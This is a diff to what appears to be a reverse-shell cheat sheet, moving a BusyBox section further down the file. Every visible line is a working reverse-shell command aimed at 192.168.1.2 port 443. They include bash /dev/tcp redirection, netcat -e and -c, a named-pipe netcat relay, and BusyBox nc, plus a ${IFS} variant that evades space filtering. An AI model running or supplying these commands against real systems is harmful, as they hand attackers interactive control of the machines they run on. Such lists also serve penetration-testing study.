@@ -99,19 +99,6 @@ bash -i >& /dev/tcp/192.168.1.2/443 0>&1
 0<&196;exec 196<>/dev/tcp/192.168.1.2/443; /bin/bash <&196 >&196 2>&196
 ```
 
-# <kbd>BusyBox</kbd>
-
-```sh
-#sh
-busybox nc 192.168.1.2 443 -e sh
-busybox nc 192.168.1.2 443 -e /bin/sh
-#bash
-busybox nc 192.168.1.2 443 -e bash
-busybox nc 192.168.1.2 443 -e /bin/bash
-#not space
-busybox${IFS}nc${IFS}192.168.1.2${IFS}443${IFS}-e${IFS}sh
-```
-
 # <kbd>read line</kbd>
 
 ```sh
@@ -184,6 +171,19 @@ nc -c /bin/bash 192.168.1.2 443
 mknod /tmp/backpipe p
 #2) reverse shell
 /bin/sh 0</tmp/backpipe | nc 192.168.1.2 443 1>/tmp/backpipe
+```
+
+# <kbd>BusyBox</kbd>
+
+```sh
+#sh
+busybox nc 192.168.1.2 443 -e sh
+busybox nc 192.168.1.2 443 -e /bin/sh
+#bash
+busybox nc 192.168.1.2 443 -e bash
+busybox nc 192.168.1.2 443 -e /bin/bash
+#not space
+busybox${IFS}nc${IFS}192.168.1.2${IFS}443${IFS}-e${IFS}sh
 ```
 
 <kbd>fifo</kbd>
